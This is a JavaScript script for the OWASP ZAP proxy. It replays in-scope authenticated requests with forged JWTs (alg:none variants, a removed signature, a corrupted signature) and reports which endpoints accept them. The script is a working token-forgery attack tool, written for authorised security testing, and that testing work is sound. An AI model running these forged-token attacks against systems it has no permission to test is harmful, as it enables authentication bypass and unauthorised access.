/*
 * ZAP Standalone Script (JavaScript / GraalVM engine)
 * STEP 4: JWT weakness probing — for every in-scope endpoint whose request
 *         carries a JWT (default: the "Authorization: Bearer <jwt>" header),
 *         replay the request with a set of forged/tampered tokens and compare
 *         the response against the authenticated baseline already stored in
 *         ZAP's History.
 *
 * Script type: Stand Alone
 *
 * Attacks sent per endpoint (payload claims are preserved unless noted, so a
 * success means the server accepted a token it should have rejected):
 *   - alg:none / None / NONE  -> header alg swapped, signature dropped
 *   - signature removed        -> original header kept, signature emptied
 *   - signature corrupted      -> original header+payload, signature mangled
 *
 * Verdict (per attack):
 *   FLAG   : attack response is 2xx  (forged/invalid token accepted)
 *            -> "matches baseline" when status+body-size match the authed one
 *   OK     : 401/403 (rejected, expected)
 *   REVIEW : anything else (500, redirect, etc — check manually)
 *   ERROR  : request threw
 *
 * NOTE: these attacks need NO signing key. They detect servers that (a) honour
 * the "none" algorithm, or (b) never verify the signature at all. They do NOT
 * test weak-secret/HS256 brute force or RS256->HS256 key confusion (those need
 * the public key) — add them separately if required.
 *
 * Only endpoints in an in-scope ZAP Context are tested
 * (SiteNode.isIncludedInScope()).
 *
 * References (verified 2026-09-02):
 * - HttpMessage.cloneAll(): https://github.com/zaproxy/community-scripts/blob/main/httpsender/README.md
 * - HttpSender ctor + sendAndReceive: https://groups.google.com/g/zaproxy-develop/c/_RZtqweBSws
 * - SiteNode walk / isLeaf / getHistoryReference:
 *   https://github.com/zaproxy/zap-core-help-id_ID/wiki/HelpUiDialogsBeanshell
 * - SiteNode.isIncludedInScope():
 *   http://useof.org/java-open-source/org.zaproxy.zap.model.StructuralNode
 * - java.util.Base64 url-safe codec: https://docs.oracle.com/javase/8/docs/api/java/util/Base64.html
 */

var Model       = Java.type("org.parosproxy.paros.model.Model");
var HttpSender  = Java.type("org.parosproxy.paros.network.HttpSender");
var Control     = Java.type("org.parosproxy.paros.control.Control");
var ExtensionHistory = Java.type("org.parosproxy.paros.extension.history.ExtensionHistory");
var HistoryReference = Java.type("org.parosproxy.paros.model.HistoryReference");
var ScriptVars  = Java.type("org.zaproxy.zap.extension.script.ScriptVars");
var Thread      = Java.type("java.lang.Thread");
var Base64      = Java.type("java.util.Base64");
var JString     = Java.type("java.lang.String");

// ---- CONFIG --------------------------------------------------------------
// Header that carries the JWT, and the auth scheme prefix in front of it.
// (Scheme is auto-detected from the captured value; this is the fallback.)
var TOKEN_HEADER   = "Authorization";
var DEFAULT_SCHEME = "Bearer";

// Optionally forge from ONE token applied to every endpoint, instead of
// reading each endpoint's own captured TOKEN_HEADER. Paste the full header
// value (including the scheme). Leave "" to use each request's own token.
//   MUST be a JWT (header.payload.signature). An opaque/random bearer token
//   has no algorithm or signature to attack and will be rejected at startup.
var AUTH_HEADER_VALUE = "";

// Pause (ms) between each replayed request so the target isn't hammered.
var THROTTLE_MS = 150;

// Case-insensitive substrings that mark an auth rejection *in the body*, so a
// "200 OK" carrying {"error":"invalid token"} is treated as enforced, not a
// FLAG. Tune to your app's error vocabulary.
var AUTH_ERROR_MARKERS = [
    "unauthorized", "unauthenticated", "forbidden", "access denied",
    "not authorized", "permission denied", "invalid token",
    "invalid signature", "token expired", "jwt expired", "malformed",
    "login required", "authentication required", "session expired"
];
// --------------------------------------------------------------------------

// initiator 6 = MANUAL_REQUEST_INITIATOR
var httpSender = new HttpSender(
    Model.getSingleton().getOptionsParam().getConnectionParam(),
    false,
    6
);
// Keep the cookie jar / global HTTP state from re-attaching a session cookie;
// the only credential under test is the JWT we set ourselves. Guarded so an
// older ZAP build without these setters doesn't abort the script.
function safeDisable(fnName) {
    try {
        if (typeof httpSender[fnName] === "function") {
            httpSender[fnName](false);
        } else {
            print("[WARN] HttpSender." + fnName + "() not available on this ZAP build; relying on ctor useGlobalState=false");
        }
    } catch (e) {
        print("[WARN] HttpSender." + fnName + "(false) failed: " + e + "; relying on ctor useGlobalState=false");
    }
}
safeDisable("setUseGlobalState");
safeDisable("setUseCookies");

var extHistory = Control.getSingleton().getExtensionLoader().getExtension(ExtensionHistory.class);

var siteTree = Model.getSingleton().getSession().getSiteTree();
var root = siteTree.getRoot();

var results = [];

// Dedup: the Sites tree can hold several nodes for the same endpoint;
// only probe each method+url once.
var seenEndpoints = {};

// Graceful stop: when you stop/close the script, ZAP interrupts its thread.
// We watch for that and unwind cleanly, printing whatever we have so far.
var aborted = false;
function checkStop() {
    if (!aborted && Thread.currentThread().isInterrupted()) {
        aborted = true;
    }
    return aborted;
}
function throttle(ms) {
    if (ms > 0) {
        try { Thread.sleep(ms); }
        catch (e) { aborted = true; } // InterruptedException => stop requested
    }
}

function pad(str, len) {
    str = String(str);
    return str.length >= len ? str.substring(0, len) : str + Array(len - str.length + 1).join(" ");
}

// ---- display helpers -----------------------------------------------------
var LINE = "========================================================================";
var THIN = "------------------------------------------------------------------------";
var MARK = { FLAG: "[!]", REVIEW: "[?]", OK: "[+]", ERROR: "[x]" };

// Print all results carrying one tag as a titled, counted group.
function printGroup(tag, title) {
    var rows = results.filter(function (r) { return r.tag === tag; });
    if (rows.length === 0) return;
    print("");
    print(MARK[tag] + " " + title + "  (" + rows.length + ")");
    print(THIN);
    rows.forEach(function (r) {
        print("  " + pad(String(r.status), 5) + pad(r.attack, 22) + pad(r.method, 7) + r.url);
        if (tag === "FLAG") {
            print("       baseline " + r.baseStatus + "  |  body " + r.testLen + " vs " + r.baseLen + " B" +
                  (r.matchesBaseline ? "  |  *** MATCHES BASELINE ***" : ""));
            print("       " + r.verdict);
            print("       path: " + r.path);
        } else if (tag === "REVIEW") {
            print("       baseline " + r.baseStatus + "  |  " + r.verdict);
        } else if (tag === "ERROR") {
            print("       " + r.verdict);
            print("       path: " + r.path);
        }
    });
}

// Does a response body look like an auth/JWT rejection, regardless of status?
function bodyHasAuthError(bodyText) {
    if (!bodyText) return false;
    var lc = String(bodyText).toLowerCase();
    for (var i = 0; i < AUTH_ERROR_MARKERS.length; i++) {
        if (lc.indexOf(AUTH_ERROR_MARKERS[i]) !== -1) return true;
    }
    return false;
}

// Content comparison, not just length: exact match, or (when sizes are close)
// identical head AND tail. Guards against two different bodies that happen to
// be the same byte count.
function bodiesSimilar(a, b, lenClose) {
    a = String(a); b = String(b);
    if (a === b) return true;
    if (!lenClose) return false;
    var n = Math.min(128, a.length, b.length);
    if (n === 0) return false;
    return a.substring(0, n) === b.substring(0, n) &&
           a.substring(a.length - n) === b.substring(b.length - n);
}

// ---- base64url helpers ---------------------------------------------------
function b64urlDecodeToStr(seg) {
    var clean = String(seg).replace(/=+$/, ""); // tolerate stray padding
    var bytes = Base64.getUrlDecoder().decode(clean);
    return new JString(bytes, "UTF-8");
}
function b64urlEncodeStr(str) {
    var bytes = new JString(str).getBytes("UTF-8");
    return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
}

// Does a header value contain a JWT? Returns {scheme, token, parts} or null.
function extractJwt(headerValue) {
    if (!headerValue) return null;
    var value = String(headerValue).trim();
    var scheme = DEFAULT_SCHEME;
    var token = value;

    var sp = value.indexOf(" ");
    if (sp !== -1) {
        scheme = value.substring(0, sp);
        token = value.substring(sp + 1).trim();
    }
    var parts = token.split(".");
    if (parts.length !== 3) return null;        // not a JWS/JWT
    if (parts[0].length === 0 || parts[1].length === 0) return null;
    return { scheme: scheme, token: token, parts: parts };
}

// Build the list of forged tokens from a real one. Each entry: {label, token}.
function buildForgedTokens(jwt) {
    var parts = jwt.parts;
    var header = parts[0], payload = parts[1], sig = parts[2];
    var forged = [];

    // alg:none family — re-encode the header with alg set, drop the signature.
    var headerObj = null;
    try {
        headerObj = JSON.parse(b64urlDecodeToStr(header));
    } catch (e) {
        headerObj = null; // header not decodable; skip the alg:none variants
    }
    if (headerObj !== null) {
        ["none", "None", "NONE"].forEach(function (algVal) {
            var h = {};
            for (var k in headerObj) { if (headerObj.hasOwnProperty(k)) h[k] = headerObj[k]; }
            h.alg = algVal;
            var newHeader = b64urlEncodeStr(JSON.stringify(h));
            forged.push({ label: "alg:" + algVal, token: newHeader + "." + payload + "." });
        });
    }

    // Signature removed — keep the original (signed) header, empty signature.
    forged.push({ label: "signature removed", token: header + "." + payload + "." });

    // Signature corrupted — a correctly verifying server MUST reject this.
    if (sig.length > 0) {
        var last = sig.charAt(sig.length - 1);
        var repl = (last === "A") ? "B" : "A";
        forged.push({
            label: "signature corrupted",
            token: header + "." + payload + "." + (sig.substring(0, sig.length - 1) + repl)
        });
    }

    return forged;
}

function sendForged(baseMsg, method, url, path, baseStatus, baseLen, scheme, attack) {
    try {
        var testMsg = baseMsg.cloneAll();
        testMsg.getRequestHeader().setHeader(TOKEN_HEADER, scheme + " " + attack.token);

        // Do NOT follow redirects: a 302 -> login would otherwise be read as
        // a successful request.
        httpSender.sendAndReceive(testMsg, false);
        throttle(THROTTLE_MS);

        if (extHistory !== null) {
            try { extHistory.addHistory(testMsg, HistoryReference.TYPE_ZAP_USER); }
            catch (histErr) { /* non-fatal */ }
        }

        var testStatus = testMsg.getResponseHeader().getStatusCode();
        var testLen = testMsg.getResponseBody().length();
        var testBody = testMsg.getResponseBody().toString();
        var baseBody = baseMsg.getResponseBody().toString();

        // A 2xx carrying a token/auth-error message is still a rejection.
        var bodyRejects = bodyHasAuthError(testBody);
        var is2xx = testStatus >= 200 && testStatus < 300;
        var enforced = (testStatus === 401 || testStatus === 403) || (is2xx && bodyRejects);
        var flagged = !enforced && is2xx;

        var baseWas2xx = baseStatus >= 200 && baseStatus < 300;
        var lenClose = baseLen > 0 &&
            Math.abs(testLen - baseLen) <= Math.max(16, baseLen * 0.05);
        var matchesBaseline = flagged && baseWas2xx && bodiesSimilar(testBody, baseBody, lenClose);

        var tag = flagged ? "FLAG" : (enforced ? "OK" : "REVIEW");
        var verdict;
        if (flagged) {
            verdict = matchesBaseline
                ? "forged token accepted - response matches authenticated baseline (status+body)"
                : (baseWas2xx
                    ? "forged token accepted (2xx) but body differs from baseline - check manually"
                    : "forged token returned 2xx; baseline was " + baseStatus + " - check manually");
        } else if (enforced) {
            verdict = (testStatus === 401 || testStatus === 403)
                ? "rejected as expected"
                : "2xx but body signals an auth error - treated as rejected";
        } else {
            verdict = "unexpected status (baseline " + baseStatus + "), check manually";
        }

        results.push({
            tag: tag, attack: attack.label, path: path, method: method, url: url,
            status: testStatus, baseStatus: baseStatus,
            testLen: testLen, baseLen: baseLen,
            matchesBaseline: matchesBaseline, verdict: verdict
        });
    } catch (e) {
        print("[ERROR] " + attack.label + "  " + method + " " + url + "  [" + path + "]  :: " + e);
        results.push({
            tag: "ERROR", attack: attack.label, path: path, method: method, url: url,
            status: "-", baseStatus: baseStatus, testLen: "-", baseLen: baseLen,
            matchesBaseline: false, verdict: String(e)
        });
    }
}

function testEndpoint(node, path) {
    var href = node.getHistoryReference();
    if (href === null || !node.isLeaf()) return;
    if (!node.isIncludedInScope()) return;

    try {
        var baseMsg = href.getHttpMessage();
        var method = baseMsg.getRequestHeader().getMethod();
        var url = baseMsg.getRequestHeader().getURI().toString();

        var dedupKey = method + " " + url;
        if (seenEndpoints[dedupKey]) return;
        seenEndpoints[dedupKey] = true;

        var jwt = USE_OVERRIDE
            ? OVERRIDE_JWT
            : extractJwt(baseMsg.getRequestHeader().getHeader(TOKEN_HEADER));
        if (jwt === null) return; // endpoint carries no JWT in TOKEN_HEADER

        var baseStatus = baseMsg.getResponseHeader().getStatusCode();
        var baseLen = baseMsg.getResponseBody().length();

        var forged = buildForgedTokens(jwt);
        for (var i = 0; i < forged.length; i++) {
            if (checkStop()) return;
            sendForged(baseMsg, method, url, path, baseStatus, baseLen, jwt.scheme, forged[i]);
        }
    } catch (e) {
        print("[WARN] error processing '" + path + "': " + e);
    }
}

function walk(node, path) {
    var childCount = node.getChildCount();
    for (var i = 0; i < childCount; i++) {
        if (checkStop()) return;
        var child = node.getChildAt(i);
        var newPath = path + " / " + child.getNodeName();
        testEndpoint(child, newPath);
        if (checkStop()) return;
        walk(child, newPath);
    }
}

// Resolve the token source once, up front.
var USE_OVERRIDE = AUTH_HEADER_VALUE && String(AUTH_HEADER_VALUE).trim().length > 0;
var OVERRIDE_JWT = USE_OVERRIDE ? extractJwt(AUTH_HEADER_VALUE) : null;

print("");
print("========================================================================");
print(" JWT WEAKNESS PROBE - alg:none / signature removed / signature corrupted");
print("========================================================================");

if (USE_OVERRIDE && OVERRIDE_JWT === null) {
    print("");
    print("[ABORT] AUTH_HEADER_VALUE is set but is NOT a JWT (it needs three");
    print("        base64url parts: header.payload.signature).");
    print("        The value looks like an opaque/random bearer token, which has");
    print("        no algorithm or signature to forge - these attacks don't apply.");
    print("        Paste a real JWT, or set AUTH_HEADER_VALUE = \"\" to read each");
    print("        request's own token. Nothing tested.");
    print("========================================================================");
} else {
    if (USE_OVERRIDE) {
        print(" Using supplied AUTH_HEADER_VALUE token for every endpoint.");
    }
    walk(root, "");

if (aborted) {
    print("");
    print("*** STOPPED by user - partial results below (" + results.length + " test(s) completed) ***");
}

var counts = { FLAG: 0, REVIEW: 0, OK: 0, ERROR: 0 };
results.forEach(function (r) { counts[r.tag] = (counts[r.tag] || 0) + 1; });

print("");
print(LINE);
print(" RESULTS   " + results.length + " test(s) across " +
      Object.keys(seenEndpoints).length + " endpoint(s)");
print("   " + MARK.FLAG + " " + counts.FLAG + " flagged     " +
      MARK.REVIEW + " " + counts.REVIEW + " review     " +
      MARK.OK + " " + counts.OK + " ok     " +
      MARK.ERROR + " " + counts.ERROR + " error");
print(LINE);

// Most important first; empty groups are skipped automatically.
printGroup("FLAG",   "FLAGGED - forged/invalid token accepted (investigate first)");
printGroup("REVIEW", "REVIEW - unexpected response, check manually");
printGroup("ERROR",  "ERROR - request failed");
printGroup("OK",     "OK - token rejected as expected");
print("");

ScriptVars.setGlobalCustomVar("jwt.results", JSON.stringify(results));
} // end: token source resolved and probe run
